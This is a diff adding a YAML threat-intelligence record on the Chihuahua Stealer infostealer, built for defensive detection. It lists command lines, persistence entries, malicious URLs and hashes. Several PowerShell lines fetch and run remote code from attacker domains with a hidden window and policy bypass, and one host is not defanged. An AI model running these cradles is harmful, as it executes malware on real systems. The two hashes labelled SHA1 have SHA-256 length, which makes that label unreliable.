@@ -1,0 +1,63 @@
+description: The Chihuahua Stealer is a newly discovered .NET-based infostealer that
+  utilizes advanced techniques like multi-stage payloads, scheduled tasks for persistence,
+  and AES-GCM encryption to steal browser data and crypto wallet extensions.
+attribution: Unknown
+malware_families:
+- Chihuahua Stealer
+authors:
+- Lovely Antonio
+- Chloe de Leon
+TTPs:
+  processes:
+  - powershell.exe
+  - wmiprvse.exe
+  commandline:
+  - powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\Users\Public\Documents\f90g30g82.ps1
+  - wmic process where name="powershell.exe" call setpriority 24,1
+  - powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command
+    "iex (New-Object Net.WebClient).DownloadString(\"hxxps://cat-watches-site[.]xyz\")"
+  powershell:
+  - '$a = New-Object Net.WebClient
+
+    $b = $a.DownloadString("https://cdn.findfakesnake.xyz")
+
+    Invoke-Expression $b
+
+    '
+  - iex (New-Object Net.WebClient).DownloadString("hxxps://cat-watches-site[.]xyz")
+  registry_keys:
+  - HKCU:\Software\Microsoft\Windows\CurrentVersion\Run\f90g30g82
+  network_connections:
+  - executable: powershell.exe
+    destination_address: cdn.findfakesnake.xyz
+    port: 443
+    url: hxxps://cdn.findfakesnake.xyz/
+  - executable: powershell.exe
+    destination_address: cat-watches-site[.]xyz
+    port: 443
+    url: hxxps://cat-watches-site[.]xyz/
+  - executable: powershell.exe
+    destination_address: flowers[.]hold-me-finger[.]xyz
+    port: 443
+    url: hxxps://flowers[.]hold-me-finger[.]xyz/index2[.]php
+  file_modifications:
+  - C:\Users\Public\Documents\f90g30g82.ps1
+  - Brutan.txt
+  - .chihuahua archive
+  persistence:
+  - Scheduled Task: f90g30g82
+  pipes: []
+  process_relations: []
+IOCs:
+- IP: ''
+- URLs:
+  - hxxps://onedrive[.]office-note[.]com/res?a=c&b=&c=8f2669e5-01c0-4539-8d87-110513256828&s=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiI4YTJlNmI1MDQ4M2E5MWYyODkzNTQ4Y2M1MDUwMdg1NyIsInN1YiI6IjEzN2JkZG0zYjZhOTYiQ.vXOOM_cWpG2OmzSx5t2l9A6ecnMKFzunS4LWccgfPjA
+  - hxxps://flowers[.]hold-me-finger[.]xyz/index2[.]php
+  - hxxps://cat-watches-site[.]xyz/
+  - hxxps://cdn.findfakesnake.xyz/
+- Hashes:
+  - SHA1: afa819c9427731d716d4516f2943555f24ef13207f75134986ae0b67a0471b84
+  - SHA1: c9bc4fdc899e4d82da9dd1f7a08b57ac62fc104f93f2597615b626725e12cae8
+reference: https://www.gdatasoftware.com/blog/2025/05/38199-chihuahua-infostealer
+date_of_publication: May 13, 2025
+file_creation_date: May 22, 2025
